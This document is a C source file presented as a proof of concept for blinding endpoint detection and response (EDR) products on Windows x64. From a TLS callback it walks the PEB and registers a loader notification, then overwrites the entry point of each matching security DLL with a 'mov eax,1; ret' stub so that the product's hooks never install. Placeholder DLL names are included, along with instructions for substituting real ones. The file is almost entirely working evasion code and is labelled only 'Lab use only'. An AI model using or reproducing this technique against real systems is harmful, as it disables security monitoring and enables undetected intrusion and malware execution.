/*
 * PRECUT — TLS callback entry-point stubbing PoC
 *
 * Stubs EDR hooking DLL entry points before DllMain runs by exploiting
 * the timing gap between EXE TLS callbacks and NtTestAlert (APC drain).
 *
 * Flow:
 *   1. Loader fires TLS callback (before NtTestAlert)
 *   2. We PEB-walk for already-mapped targets (Write A — usually 0 hits)
 *   3. We register LdrRegisterDllNotification (Write B)
 *   4. NtTestAlert drains APC → EDR DLLs get mapped
 *   5. Our notification fires BEFORE each DllMain
 *   6. We overwrite AddressOfEntryPoint with: mov eax,1; ret (B8 01 C3)
 *   7. Loader calls the stub → returns TRUE → real DllMain never runs
 *
 * Placeholder DLL names below match nothing. Edit is_hooking_dll():
 *   prefix_dll() → versioned DLLs (suffix changes per agent update)
 *   wicmp()      → fixed-name DLLs (same filename across versions)
 *
 * MSVC only, x64, /MT. Lab use only.
 */

#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <winternl.h>

#ifndef _WIN64
#error x64 only.
#endif

/* --- Undocumented ntdll loader notification types ----------------------
 * Not in any SDK header. Stable across Win10/11 through 10.0.26100. */

typedef struct _LDR_DLL_LOADED_NOTIFICATION_DATA {
    ULONG           Flags;
    PUNICODE_STRING FullDllName;
    PUNICODE_STRING BaseDllName;
    PVOID           DllBase;
    ULONG           SizeOfImage;
} LDR_DLL_LOADED_NOTIFICATION_DATA;

typedef union _LDR_DLL_NOTIFICATION_DATA {
    LDR_DLL_LOADED_NOTIFICATION_DATA Loaded;
} LDR_DLL_NOTIFICATION_DATA, *PLDR_DLL_NOTIFICATION_DATA;

#define LDR_DLL_NOTIFICATION_REASON_LOADED 1

typedef VOID (CALLBACK *PLDR_DLL_NOTIFICATION_FUNCTION)(
    ULONG, PLDR_DLL_NOTIFICATION_DATA, PVOID);

typedef NTSTATUS (NTAPI *fnLdrRegisterDllNotification)(
    ULONG, PLDR_DLL_NOTIFICATION_FUNCTION, PVOID, PVOID *);

/* Partial LDR_DATA_TABLE_ENTRY for PEB InMemoryOrderModuleList walk */
typedef struct _PC_LDR {
    LIST_ENTRY     InLoadOrderLinks;
    LIST_ENTRY     InMemoryOrderLinks;
    LIST_ENTRY     InInitializationOrderLinks;
    PVOID          DllBase;
    PVOID          EntryPoint;
    ULONG          SizeOfImage;
    UNICODE_STRING FullDllName;
    UNICODE_STRING BaseDllName;
} PC_LDR;

static VOID CALLBACK on_dll_loaded(
    ULONG reason, PLDR_DLL_NOTIFICATION_DATA data, PVOID ctx);

/* --- Name matching -----------------------------------------------------
 * Loader names are UNICODE_STRING with arbitrary case. copy_uname
 * normalises to a C string; matchers fold ASCII case. prefix_dll also
 * requires a ".dll" suffix to avoid hitting .cfg/.sys files. */

static wchar_t fold(wchar_t c)
{
    return (c >= L'A' && c <= L'Z') ? (wchar_t)(c + 32) : c;
}

static int copy_uname(const UNICODE_STRING *u, wchar_t *out, int cap)
{
    int n, i;
    if (!u || !u->Buffer || u->Length == 0 || cap < 2) return 0;
    n = (int)(u->Length / sizeof(wchar_t));
    if (n >= cap) n = cap - 1;
    for (i = 0; i < n; i++) out[i] = u->Buffer[i];
    out[n] = 0;
    return n;
}

/* Case-insensitive prefix match + ".dll" suffix guard */
static int prefix_dll(const wchar_t *name, const wchar_t *prefix)
{
    int i = 0, n = 0;
    if (!name || !prefix) return 0;
    while (prefix[i]) {
        if (fold(name[i]) != fold(prefix[i])) return 0;
        i++;
    }
    if (!name[i]) return 0;      /* prefix consumed the entire name */
    while (name[n]) n++;
    if (n < 4) return 0;         /* too short to hold ".dll" */
    return fold(name[n-4]) == L'.' && fold(name[n-3]) == L'd'
        && fold(name[n-2]) == L'l' && fold(name[n-1]) == L'l';
}

/* Case-insensitive wide string compare; returns 0 when equal */
static int wicmp(const wchar_t *a, const wchar_t *b)
{
    while (*a && *b) {
        wchar_t la = fold(*a), lb = fold(*b);
        if (la != lb) return (int)(la - lb);
        a++; b++;
    }
    return (int)(fold(*a) - fold(*b));
}

/* --- Target DLL matching -----------------------------------------------
 *
 * Replace placeholders with real DLL names from your lab (use lm in
 * WinDbg or break on ntdll!LdrLoadDll to enumerate mapped modules).
 *
 * Two strategies:
 *
 *   prefix_dll(name, L"hookeng")
 *       For versioned DLLs — suffix (build number, hash) changes per
 *       agent update. Give only the stable leading part.
 *       Matches: hookeng.dll, hookeng8542.dll, hookeng_v3.dll
 *
 *   wicmp(name, L"client64.dll") == 0
 *       For fixed-name DLLs — filename never changes across versions.
 *       Exact match only.
 *
 * Picking the wrong one:
 *   - EXACT on a versioned DLL: works until the agent updates and the
 *     suffix changes — then silently stops matching. No crash, but the
 *     EDR hooks load normally and you won't notice.
 *   - PREFIX on a fixed-name DLL: works fine. Only risk is collateral
 *     matches if the prefix is generic (e.g. "agent" would also hit
 *     "agenthelper.dll"). Stubbing the wrong module crashes the process.
 *
 * PREFIX is the safer default for most vendor-specific names. Use EXACT
 * when the prefix is too generic to be collision-free.
 *
 * Add or remove entries freely — no fixed count required. */
static int is_hooking_dll(const wchar_t *basename)
{
    /* Versioned DLLs: prefix match (suffix changes per update) */
    if (prefix_dll(basename, L"edr_hook"))     return 1;
    if (prefix_dll(basename, L"edr_dev"))      return 1;

    /* Fixed-name DLLs: exact match (filename never changes) */
    if (wicmp(basename, L"edrclient64.dll") == 0) return 1;
    if (wicmp(basename, L"edrclient.dll") == 0)   return 1;

    return 0;
}

/* --- Entry-point stubbing ----------------------------------------------
 * Overwrites AddressOfEntryPoint with B8 01 00 00 00 C3 (mov eax,1; ret).
 * DllMain contract: nonzero = success. Loader thinks the DLL initialised;
 * real init code (the one that plants inline hooks) never ran.
 * Validates MZ/PE sigs, bounds-checks the RVA, skips if already stubbed.
 * Page is flipped to RWX for the 6-byte write, then restored. */
static void stub_entry(PVOID dll_base)
{
    BYTE *base = (BYTE *)dll_base;
    IMAGE_DOS_HEADER *dos;
    IMAGE_NT_HEADERS *nt;
    DWORD ep_rva, old;
    BYTE *ep;
    static const BYTE stub[6] = { 0xB8, 0x01, 0x00, 0x00, 0x00, 0xC3 };

    if (!base) return;
    dos = (IMAGE_DOS_HEADER *)base;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return;
    nt = (IMAGE_NT_HEADERS *)(base + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) return;

    ep_rva = nt->OptionalHeader.AddressOfEntryPoint;
    if (!ep_rva || (SIZE_T)ep_rva + 6 > nt->OptionalHeader.SizeOfImage)
        return;
    ep = base + ep_rva;

    /* Already stubbed — idempotent */
    if (ep[0] == 0xB8 && ep[1] == 0x01 && ep[2] == 0x00 &&
        ep[3] == 0x00 && ep[4] == 0x00 && ep[5] == 0xC3)
        return;

    if (!VirtualProtect(ep, sizeof(stub), PAGE_EXECUTE_READWRITE, &old))
        return;
    CopyMemory(ep, stub, sizeof(stub));
    VirtualProtect(ep, sizeof(stub), old, &old);
}

/* Write A: PEB walk — stub targets already mapped when TLS fires.
 * Usually 0 hits (EDR DLLs arrive via APC after NtTestAlert), but covers
 * products that map their client DLL before user-mode TLS. */
static void peb_stub_loaded(void)
{
    PPEB peb = (PPEB)__readgsqword(0x60);
    LIST_ENTRY *head, *cur;
    if (!peb || !peb->Ldr) return;
    head = &peb->Ldr->InMemoryOrderModuleList;
    for (cur = head->Flink; cur != head; cur = cur->Flink) {
        PC_LDR *mod = CONTAINING_RECORD(cur, PC_LDR, InMemoryOrderLinks);
        wchar_t name[256];
        if (!copy_uname(&mod->BaseDllName, name, 256)) continue;
        if (is_hooking_dll(name) && mod->DllBase)
            stub_entry(mod->DllBase);
    }
}

/* Write B (primary method): notification fires after map, before DllMain.
 * We overwrite the entry point → loader calls our stub → returns 1. */
static VOID CALLBACK on_dll_loaded(
    ULONG reason, PLDR_DLL_NOTIFICATION_DATA data, PVOID ctx)
{
    wchar_t name[256];
    (void)ctx;
    if (reason != LDR_DLL_NOTIFICATION_REASON_LOADED) return;
    if (!data || !data->Loaded.BaseDllName) return;
    if (!copy_uname(data->Loaded.BaseDllName, name, 256)) return;
    if (!is_hooking_dll(name)) return;
    stub_entry(data->Loaded.DllBase);
}

/* Resolve LdrRegisterDllNotification from ntdll and register our callback */
static void arm_notification(void)
{
    HMODULE ntdll;
    fnLdrRegisterDllNotification p_reg;
    PVOID cookie = NULL;

    ntdll = GetModuleHandleW(L"ntdll.dll");
    if (!ntdll) return;
    p_reg = (fnLdrRegisterDllNotification)GetProcAddress(
        ntdll, "LdrRegisterDllNotification");
    if (!p_reg) return;
    p_reg(0, on_dll_loaded, NULL, &cookie);
}

/* --- TLS callback and MSVC plumbing ------------------------------------
 * CRT is NOT initialised inside the TLS callback. No stdio, no CRT heap.
 * kernel32 calls (GetModuleHandleW, GetProcAddress, VirtualProtect) are
 * safe — kernel32 is mapped and initialised before any EXE code runs.
 *
 * Three pieces make the TLS directory exist:
 *   .CRT$XLB section     — callback pointer in the TLS array
 *   /INCLUDE:_tls_used   — keeps the linker from dead-stripping TLS
 *   __declspec(thread)   — keeps TLS apparatus from being optimised away */

static void NTAPI tls_callback(PVOID h, DWORD reason, PVOID r)
{
    (void)h; (void)r;
    if (reason != DLL_PROCESS_ATTACH) return;
    peb_stub_loaded();    /* Write A */
    arm_notification();   /* arm Write B */
}

#ifdef _MSC_VER
#pragma comment(linker, "/INCLUDE:_tls_used")
#pragma section(".CRT$XLB", long, read)
__declspec(allocate(".CRT$XLB")) PIMAGE_TLS_CALLBACK g_tls_cb = tls_callback;
__declspec(thread) static volatile int g_tls_sentinel = 0;
#else
#error Build with MSVC /MT so the PE has a TLS directory.
#endif

int main(void)
{
    (void)g_tls_sentinel;
    return 0;
}
